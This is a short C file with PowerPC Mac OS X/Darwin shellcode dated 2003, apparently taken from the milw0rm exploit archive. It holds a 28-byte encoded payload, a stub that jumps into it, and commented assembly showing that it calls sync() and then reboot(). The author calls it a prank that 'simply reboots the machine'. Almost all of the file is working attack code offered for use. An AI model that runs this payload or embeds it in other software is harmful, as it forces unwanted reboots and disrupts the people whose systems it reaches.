/*
PPC OSX/Darwin Shellcode by B-r00t. 2003.
Does sync() reboot();
See ASM below.
28 Bytes.
*/

char shellcode[] =
"\x7c\x63\x1a\x79"
"\x39\x40\x01\x70"
"\x38\x0a\xfe\xb4"
"\x44\xff\xff\x02"
"\x60\x60\x60\x60"
"\x38\x0a\xfe\xc7"
"\x44\xff\xff\x02";

int main (void)
{
        __asm__("b _shellcode");
}

/*
; PPC OS X / Darwin Shellcode by B-r00t.
; sync() reboot().
; Simply reboots the machine! - Just 4 Fun!
;
.globl _main
.text
_main:
        xor.    r3, r3, r3
        li      r10, 368
        addi    r0, r10, -332
        .long   0x44ffff02
        .long   0x60606060
        addi    r0, r10, -313
        .long   0x44ffff02
*/

// milw0rm.com [2004-09-26]